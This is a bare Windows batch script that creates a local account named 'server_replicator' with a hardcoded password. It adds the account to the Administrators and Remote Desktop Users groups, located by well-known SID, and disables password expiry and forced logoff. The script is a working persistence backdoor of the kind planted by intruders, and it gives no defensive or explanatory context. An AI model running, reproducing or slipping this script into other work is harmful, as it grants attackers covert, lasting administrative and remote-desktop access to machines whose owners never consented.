@Echo off
set user=server_replicator
set pass=Admin@123467

set AdmGroupSID=S-1-5-32-544
set AdmGroup=
For /F "UseBackQ Tokens=1* Delims==" %%I In (`WMIC Group Where "SID = '%AdmGroupSID%'" Get Name /Value ^| Find "="`) Do set AdmGroup=%%J
set AdmGroup=%AdmGroup:~0,-1%
net user %user% %pass% /add /active:YES /expires:NEVER
net user %user% /expires:NEVER
net localgroup %AdmGroup% %user% /add
set RDPGroupSID=S-1-5-32-555
set RDPGroup=
For /F "UseBackQ Tokens=1* Delims==" %%I In (`WMIC Group Where "SID = '%RDPGroupSID%'" Get Name /Value ^| Find "="`) Do set RDPGroup=%%J
set RDPGroup=%RDPGroup:~0,-1%
net localgroup "%RDPGroup%" %user% /add
net accounts /forcelogoff:no /maxpwage:unlimited